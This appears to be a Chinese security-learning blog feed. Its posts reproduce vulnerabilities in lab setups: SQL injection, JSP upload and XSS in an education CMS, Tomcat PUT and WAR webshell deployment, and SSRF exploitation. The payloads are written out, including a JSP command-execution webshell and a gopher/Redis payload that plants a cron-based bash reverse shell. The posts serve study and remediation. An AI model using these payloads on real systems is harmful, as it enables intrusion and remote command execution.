<h4 id="后台Sql注入漏洞"><a href="#后台Sql注入漏洞" class="headerlink" title="后台Sql注入漏洞"></a>后台Sql注入漏洞</h4><h5 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h5><p>我们已经知道了系统采用mybatis，mybatis最常见的注入就是使用${}，直接就来找<code>$</code>符号，看看哪些是直接调用了<code>$</code>来进行取值并且没经过过滤的。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213173933.png" alt></p>
<p>找到了一处，我们逆向追踪调用逻辑，寻找是否含有过滤并且参数我们是否可控。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174226.png" alt></p>
<p>可以看到接口的实现类里并没有对传入的ids参数进行过滤。继续追踪。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174750.png" alt></p>
<p>跟踪到deleteArticle函数。全局搜索。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213174304.png" alt></p>
<p>可以看到控制层直接获取了articelId参数，这里的参数我们是可控的。</p>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>首先登录后台。找到文章管理部分，选择删除，抓包。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121827.png" alt></p>
<p>直接扔到sqlmap里跑。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213122138.png" alt="QQ截图20210213122138"></p>
<p>可以看到这套系统中还有多处存在这个漏洞。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213175257.png" alt></p>
<h4 id="后台任意文件上传漏洞"><a href="#后台任意文件上传漏洞" class="headerlink" title="后台任意文件上传漏洞"></a>后台任意文件上传漏洞</h4><h5 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h5><p>位置com/inxedu/os/common/controller/VideoUploadController.java,上传视频功能。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213180316.png" alt></p>
<p>  可以看到这里首先接收了fileType扩展名参数，然后仅仅判断了上传的文件名与fileType参数文件是否一致，就直接上传文件，然后返回了文件上传路径。</p>
<p>这里我们可以直接将fileType设置为jsp就可以直接上传jsp马。</p>
<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">&lt;form action="http://localhost:8080/video/uploadvideo" enctype="multipart/form-data" id="frmUpload" <span class="keyword">method</span>="post"&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="type">name</span>="uploadfile" <span class="keyword">type</span>="file"&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span> ="text" <span class="type">name</span> = "fileType" <span class="keyword">value</span>=""&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> id="btnUpload" <span class="keyword">type</span>="submit" <span class="keyword">value</span>="上传"&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>构造上传表单</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121211.png" alt></p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213121225.png" alt></p>
<h4 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h4><h5 id="源码审计-1"><a href="#源码审计-1" class="headerlink" title="源码审计"></a>源码审计</h5><p>漏洞位置:CourseController.java,功能点为前台查询课程处。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212122514.png" alt></p>
<p>我们知道${queryCourse.courseName}是spring的EL表达式。代表queryCourse这个实体类下面courseName的值，我们geng</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182040.png" alt></p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182147.png" alt></p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213182225.png" alt></p>
<h5 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>找到搜索课程处，插入漏洞payload:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213115840.png" alt></p>
<h4 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h4><h5 id="源码审计-2"><a href="#源码审计-2" class="headerlink" title="源码审计"></a>源码审计</h5><p>漏洞位置:UserController.java，功能为修改用户信息。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185228.png" alt></p>
<p>跟进对应的接口的实现类。发现并没有判断用户的权限。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185425.png" alt></p>
<p>继续跟进对应接口的实现类，直接引用mapper文件更新信息  。     </p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213185436.png" alt></p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210212133339.png" alt></p>
<h5 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>首先注册两个账户，记下user.userId。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183058.png" alt></p>
<p>登录另一个账户，抓包，替换user.userId，即可越权修改对应id的用户信息。</p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183308.png" alt></p>
<p><img src="/2021/02/16/ssm-kuang-jia-shen-ji-xue-xi-yin-ku-wang-xiao-zai-xian-jiao-yu-xi-tong-shen-ji/QQ%E6%88%AA%E5%9B%BE20210213183430.png" alt></p>
]]></content>
  </entry>
  <entry>
    <title>Tomcat中间件漏洞</title>
    <url>/2020/04/03/tomcat-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="Tomcat中间件漏洞复现"><a href="#Tomcat中间件漏洞复现" class="headerlink" title="Tomcat中间件漏洞复现"></a>Tomcat中间件漏洞复现</h2><h4 id="Tomcat简介"><a href="#Tomcat简介" class="headerlink" title="Tomcat简介"></a>Tomcat简介</h4><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
<h4 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h4><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
<p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
<h5 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h5><p>配置漏洞，开启put方法可上传文件功能。</p>
<p>tomcat文件夹下的/conf/web.xml文件插入：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">&lt;init-<span class="built_in">param</span>&gt;           &lt;<span class="built_in">param</span>-name&gt;readonly&lt;/<span class="built_in">param</span>-name&gt;           &lt;<span class="built_in">param</span>-<span class="built_in">value</span>&gt;<span class="literal">false</span>&lt;/<span class="built_in">param</span>-<span class="built_in">value</span>&gt;     &lt;/init-<span class="built_in">param</span>&gt;</span><br></pre></td></tr></table></figure>

<p>重启tomcat服务。</p>
<p><a href="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955083_5c1624cb8ac8a.png!small" alt="img"></a></p>
<p>访问127.0.0.1：8080，burp抓包，send to Repeater，将请求方式改为PUT，创建一个122.jsp，并用%20转义空格字符。123.jsp内容为：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span>.exec(request.get<span class="constructor">Parameter(<span class="string">"cmd"</span>)</span>);%</span><br></pre></td></tr></table></figure>

<p>返回201，说明创建成功。</p>
<p><a href="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955095_5c1624d7b5447.png!small" alt="img"></a></p>
<p>访问127.0.0.1：8080/122.jsp?cmd=calc。</p>
<p>弹出计算器：</p>
<p><a href="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955107_5c1624e39d5ed.png!small" alt="img"></a></p>
<p><strong>3、 漏洞修复</strong></p>
<p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p>
<p>2）更新并升级至最新版。</p>
<h3 id="（三）war后门文件部署"><a href="#（三）war后门文件部署" class="headerlink" title="（三）war后门文件部署"></a>（三）war后门文件部署</h3><p><strong>1、漏洞简介及成因</strong></p>
<p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
<p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p>
<p><strong>2、漏洞复现</strong></p>
<p>Tomcat安装目录下conf里的tomcat-users.xml配置如下：</p>
<p><a href="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955120_5c1624f0e6795.png!small" alt="img"></a></p>
<p>访问后台，登陆：</p>
<p><a href="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955131_5c1624fb87534.png!small" alt="img"></a></p>
<p>上传一个war包，里面是jsp后门：</p>
<p><a href="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955146_5c16250a9c859.png!small" alt="img"></a></p>
<p>成功上传并解析，打开：</p>
<p><a href="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955158_5c162516bfdc4.png!small" alt="img"></a></p>
<p>可执行系统命令：</p>
<p><a href="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955173_5c162525a51ea.png!small" alt="img"></a></p>
<p>也可进行文件管理，任意查看、删除、上传文件：</p>
<p><a href="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955183_5c16252f655db.png!small" alt="img"></a></p>
<p><strong>3、漏洞修复</strong></p>
<p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
<p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。</p>
<p>3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。</p>
<p>4）后台管理避免弱口令。</p>
]]></content>
      <categories>
        <category>中间件漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title>Tidesec免杀方法最新杀软测试结果</title>
    <url>/2021/08/17/tidesec-mian-sha-fang-fa-zui-xin-sha-ruan-ce-shi-jie-guo/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="63ecd0bdd48f308e41e2765b4ff5b1b25b46b568ec6b3477186b2c073cde1cfd"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>我的SSRF漏洞学习</title>
    <url>/2020/04/20/ssrf-lou-dong-xue-xi/</url>
    <content><![CDATA[<h3 id="SSRF漏洞部分"><a href="#SSRF漏洞部分" class="headerlink" title="SSRF漏洞部分"></a>SSRF漏洞部分</h3><h4 id="SSRF简述"><a href="#SSRF简述" class="headerlink" title="SSRF简述"></a>SSRF简述</h4><p><img src="/2020/04/20/ssrf-lou-dong-xue-xi/20181227082125119.png" alt></p>
<p>​       SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h5 id="漏洞形成原因"><a href="#漏洞形成原因" class="headerlink" title="漏洞形成原因"></a>漏洞形成原因</h5><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<p>例如：</p>
<p><code>www.xxx.com/a.php?image=http://www.abc.com/1.jpg</code></p>
<p>如果我们将<a href="http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">http://www.abc.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a></p>
<p>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p>
<p>SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现这个请求是否合法，然后服务器以他的身份来访问其他服务器的资源。</p>
<p><strong>curl造成的SSRF</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">	$ch=curl_init();</span><br><span class="line">	curl_setopt($ch,CURLOPT_URL,$URL);</span><br><span class="line">	curl_setopt($ch,CURLOPT_HEADER,<span class="number">0</span>);</span><br><span class="line">	curl_exec($ch);</span><br><span class="line">	curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url=$_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>file_get_contents造成的SSRF</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$url=$_GET[<span class="string">'url'</span>];</span><br><span class="line">	<span class="keyword">echo</span> file_get_contents($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul>
<li>分享：通过URL地址分享网页内容</li>
<li>转码服务</li>
<li>在线翻译</li>
<li>图片加载与下载：通过URL地址加载或下载图片</li>
<li>图片、文章收藏功能</li>
<li>未公开API实现以及其他调用URL的功能</li>
</ul>
<h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p>
<p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p>
<h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol>
<li>让服务器去访问相应的网址</li>
<li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li>
<li>可以使用file、dict、gopher、ftp协议进行请求访问相应的文件</li>
<li>攻击运行在内网或本地的应用程序（比如溢出）;</li>
<li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</li>
</ol>
<p>SSRF中各个编程语言可以使用的协议如下图所示：</p>
<p><img src="/2020/04/20/ssrf-lou-dong-xue-xi/12.png" alt></p>
<ul>
<li><p>file协议</p>
<p>​    查看文件：file:///etc/passwd</p>
</li>
<li><p>dict协议</p>
<p>​    探测端口：dict://127.0.0.1:80</p>
</li>
<li><p>gopher协议</p>
<p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">curl</span> -v 'http://sec.com:8082/sec/ssrf.php?url=gopher<span class="number">%3</span>A<span class="number">%2</span>F<span class="number">%2</span>F127.0.0.1<span class="number">%3</span>A6379<span class="number">%2</span>F_<span class="number">%2</span>A3<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%241</span><span class="number">%250</span>d<span class="number">%250</span>a1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2456</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%2</span>A<span class="number">%2</span>F1<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span><span class="number">%2</span>A<span class="number">%20</span>bash<span class="number">%20</span>-i<span class="number">%20</span><span class="number">%3</span>E<span class="number">%26</span><span class="number">%20</span><span class="number">%2</span>Fdev<span class="number">%2</span>Ftcp<span class="number">%2</span>F127.0.0.1<span class="number">%2</span>F2333<span class="number">%200</span><span class="number">%3</span>E<span class="number">%261</span><span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>adir<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2416</span><span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>Fvar<span class="number">%2</span>Fspool<span class="number">%2</span>Fcron<span class="number">%2</span>F<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A4<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%246</span><span class="number">%250</span>d<span class="number">%250</span>aconfig<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%243</span><span class="number">%250</span>d<span class="number">%250</span>aset<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2410</span><span class="number">%250</span>d<span class="number">%250</span>adbfilename<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aroot<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>asave<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%2</span>A1<span class="number">%250</span>d<span class="number">%250</span>a<span class="number">%244</span><span class="number">%250</span>d<span class="number">%250</span>aquit<span class="number">%250</span>d<span class="number">%250</span>a'</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ol>
<li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li>
<li>攻击内网应用程序（利用跨协议通信技术）</li>
<li>DOS攻击</li>
<li>判断内网主机是否存活：访问是否有端口开放</li>
</ol>
<h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul>
<li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p>
</li>
<li><p>利用特殊的域名</p>
</li>
<li><p>利用句号</p>
<p>127。0。0。1=&gt;127.0.0.1</p>
</li>
<li><p>利用协议</p>
</li>
<li><p>利用Enclosed </p>
</li>
<li><p>IP使用其他进制：127.0.0.1=2130706433</p>
</li>
<li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p>
</li>
</ul>
<h5 id><a href="#" class="headerlink" title></a><img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p>
<img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ截图20200128162933.png" style="zoom:50%;">



<p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p>
<img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ截图20200128163234.png" style="zoom:50%;">



<p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p>
<p><img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt></p>
<p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p>
<img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ截图20200128164256.png" style="zoom:50%;">



<h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p>
<img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ截图20200128170206.png" style="zoom:67%;">

<p><img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt></p>
<p> 然后使用Burp抓包后发送到Repeater模块，</p>
<p><img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt></p>
<p> 第一次我们使用http协议读取robots.txt文件内容</p>
<p><img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt></p>
<p>第二次我们使用php协议读取 xml页面中的内容</p>
<p><img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt></p>
<p>第三次我们使用file协议读取本机的/etc/passwd的内容</p>
<img src="/2020/04/20/ssrf-lou-dong-xue-xi/QQ截图20200128180043.png" style="zoom:67%;">



<h5 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h5><p><a href="https://xz.aliyun.com/t/7333" target="_blank" rel="noopener">https://xz.aliyun.com/t/7333</a></p>
<p><a href="https://damit5.com/2018/05/26/SSRF-漏洞学习" target="_blank" rel="noopener">https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0</a></p>
<p><a href="https://www.cnblogs.com/zhaijiahui/p/7828585.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/7828585.html</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>SSRF漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>WebLogic XMLDecoder反序列化漏洞学习</title>
    <url>/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/</url>
    <content><![CDATA[<h1 id="WebLogic-XMLDecoder反序列化漏洞"><a href="#WebLogic-XMLDecoder反序列化漏洞" class="headerlink" title="WebLogic XMLDecoder反序列化漏洞"></a>WebLogic XMLDecoder反序列化漏洞</h1><h3 id="weblogic简介"><a href="#weblogic简介" class="headerlink" title="weblogic简介"></a>weblogic简介</h3><p>​        Weblogic是美国Oracle公司出品的一个应用服务器(application server)，确切的说是一个基于Java EE架构的中间件，是用于开发、集成、部署和管理大型分布式Web应用、网络应用和 数据库应用的Java应用服务器。<br>​        Weblogic将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中，是商业市场上主要的Java（Java EE）应用服务器软件之一，也是世界上第一个成功商业化的Java EE应用服务器，具有可扩展性、快速开发、灵活、可靠等优势。</p>
<h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><p>一般使用的是10.3.6，这两个大版本也叫WebLogic Server 11g和WebLogic Server 12c。</p>
<h3 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>​    weblogic “wls-wsat”组件在反序列化操作时使用了Oracle官方的JDK组件中”XMLDecoder”类进行XML反序列化操作引发了代码执行。</p>
<p>XMLDecoder类用于读取使用XMLEncoder创建的XML文档</p>
<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135828.png" alt></p>
<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135902.png" alt></p>
<p><img src="/2021/02/09/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-xue-xi/QQ%E6%88%AA%E5%9B%BE20210206135929.png" alt></p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>使用vulhub中的docker搭建复现环境，搭建环境可以参考<a href="https://vulhub.org/#/docs/" target="_blank" rel="noopener">https://vulhub.org/#/docs/</a></p>
